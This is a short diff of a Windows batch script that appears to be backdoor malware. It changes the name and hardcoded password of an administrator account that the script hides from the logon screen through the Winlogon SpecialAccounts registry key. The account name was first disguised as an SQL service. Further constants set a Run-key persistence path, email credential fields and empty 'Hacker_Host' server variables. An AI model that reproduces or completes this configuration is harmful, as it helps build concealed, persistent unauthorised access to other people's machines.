@@ -7,7 +7,7 @@ rem
 rem +> Constants
 rem
 set curdir=%CD%
-set Win_Logon=MSSQLSR
+set Win_Logon=MyAdminAccount
 set Key_Var=HKLM\SYSTEM\ControlSet001\Control\Session Manager\Environment
 set Key_Invisible=HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList\%Win_Logon%
 set Key_Run=HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
@@ -46,7 +46,7 @@ set Hemail_Pass=
 rem Domains or IP's for Haker's Server. First is Public, Second is Private
 set Hacker_Host1=
 set Hacker_Host2=
-set Win_Passwd=Admin01234
+set Win_Passwd=MyAdminPassword
 rem <++++++++
 rem ==> Some Rechangable Package Variables ==
 rem
